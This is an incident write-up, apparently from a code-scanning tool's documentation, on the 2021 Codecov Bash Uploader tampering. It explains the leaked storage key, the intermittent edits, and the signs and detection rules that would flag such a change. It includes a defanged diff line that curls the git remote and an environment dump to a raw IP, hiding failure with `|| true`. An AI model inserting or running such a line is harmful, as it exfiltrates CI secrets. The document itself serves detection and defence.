# Codecov Bash Uploader

**Type:** Multi-stage backdoor (distribution tampering) · **When:** 31 Jan to 1 Apr 2021 · **Status:** confirmed

## What happened

Codecov offered a script that CI jobs downloaded and ran. An attacker edited the copy on Codecov's download storage (Google Cloud Storage). The edit added one line that sent the CI job's environment variables and git remote to the attacker. The git repository stayed clean.

## How it got in

1. A mistake in Codecov's Docker image build leaked a storage key.
2. From 31 Jan 2021 the attacker used the key to edit the hosted script.
3. The edit came and went: 108 separate windows of exposure until 1 Apr 2021.
4. Every CI job that ran `curl ... | bash` on that script sent its secrets out.
5. A customer compared the script's hash with the hash published on GitHub and found a mismatch.

## Why it was hard to spot

- The repo never changed.
- The line had a short timeout and `|| true`, so it never broke a build.
- The tampered copy came and went, so a single check could land in a clean window.

## Signs to look for

- In one change: if such a line appears in a repo: `env` or `printenv` sent to a network call; a raw IP address in a URL; a short timeout plus `|| true` hiding failure.
- Across changes over time: the file at the download URL no longer matches the file at the tagged commit; CI that pipes a downloaded script to a shell with no checksum.

## Defanged example

```
  ...normal uploader code...
+ curl -sm 0.5 -d "$(git remote -v) <env-dump>" https://<raw-ip>/upload || true
  ...normal uploader code...
```

## How Pushguard catches it

- Diff rules: if a repo adds such a line, `environment-serialized` and `hardcoded-ip-address` match it, and `shell-pipe-to-interpreter` flags `curl | bash` in your own CI.
- Not built: watching a third-party download URL and checking its hash over time. The real Codecov tampering would not be seen.

## References

- [Codecov security update](https://about.codecov.io/security-update/)
